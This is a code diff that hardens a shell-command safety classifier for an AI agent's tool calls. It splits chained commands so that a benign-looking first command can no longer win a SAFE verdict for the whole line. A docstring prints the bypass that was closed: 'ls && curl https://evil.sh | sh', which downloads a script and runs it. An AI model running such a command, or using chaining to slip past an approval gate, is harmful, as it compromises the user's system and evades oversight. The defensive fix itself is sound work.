@@ -463,6 +463,86 @@ class ToolSafetyFramework:
                 reason=f"Unknown tool: {tool_name}"
             )
     
+
+    #: Shell operators that start a new command. A SAFE verdict has to hold
+    #: for what comes after them too.
+    _SEGMENT_OPERATORS = (";", "&&", "||", "|", "\n")
+
+    @staticmethod
+    def _shell_segments(command: str) -> "Optional[List[str]]":
+        """Split a command line into the commands it actually runs.
+
+        Quote-aware, because splitting ``echo "a|b"`` on the pipe would
+        invent a second command. Returns None when the line cannot be
+        split with confidence -- unbalanced quotes, or a command
+        substitution, whose contents run before anything else does. A
+        caller that cannot see the segments must not call the line safe.
+        """
+        if "$(" in command or "`" in command:
+            return None
+        segments: List[str] = []
+        current: List[str] = []
+        quote: Optional[str] = None
+        i, n = 0, len(command)
+        while i < n:
+            ch = command[i]
+            if quote:
+                current.append(ch)
+                if ch == "\\" and quote == '"' and i + 1 < n:
+                    current.append(command[i + 1])
+                    i += 2
+                    continue
+                if ch == quote:
+                    quote = None
+                i += 1
+                continue
+            if ch in ("'", '"'):
+                quote = ch
+                current.append(ch)
+                i += 1
+                continue
+            if ch == "\\" and i + 1 < n:
+                current.append(ch)
+                current.append(command[i + 1])
+                i += 2
+                continue
+            if command.startswith("&&", i) or command.startswith("||", i):
+                segments.append("".join(current))
+                current = []
+                i += 2
+                continue
+            if ch in (";", "|", "\n", "&"):
+                segments.append("".join(current))
+                current = []
+                i += 1
+                continue
+            current.append(ch)
+            i += 1
+        if quote is not None:
+            return None
+        segments.append("".join(current))
+        return [s.strip() for s in segments if s.strip()]
+
+    def _every_segment_is_safe(self, command: str) -> bool:
+        """True only when every command on the line matches a SAFE rule.
+
+        The SAFE rules are anchored at the start of the string, so a line
+        beginning with a benign command was classified on that command
+        alone and everything after a chain operator went unexamined.
+        ``ls && curl https://evil.sh | sh`` classified SAFE, "Directory
+        listing", no confirmation -- the same shape as the `cwd` hole:
+        text the gate never looked at reaching the shell with approval
+        granted for something else.
+        """
+        segments = self._shell_segments(command)
+        if not segments:
+            return False
+        safe_rules = [r for r in self.RULES if r.risk_level == RiskLevel.SAFE]
+        return all(
+            any(rule.pattern.search(seg) for rule in safe_rules)
+            for seg in segments
+        )
+
     def _classify_command(self, command: str) -> SafetyCheckResult:
         """Classify a shell command."""
         command = command.strip()
@@ -492,8 +572,16 @@ class ToolSafetyFramework:
                     matched_rule=pattern.pattern
                 )
         
+        # A SAFE rule may only speak for a line it can see all of. The
+        # dangerous rules below are searched against the whole string and so
+        # already catch a chained `rm`; what they cannot catch is a chained
+        # command nobody wrote a rule for.
+        may_be_safe = self._every_segment_is_safe(command)
+
         # Check rules in order
         for rule in self.RULES:
+            if rule.risk_level == RiskLevel.SAFE and not may_be_safe:
+                continue
             if rule.pattern.search(command):
                 risk = rule.risk_level
                 
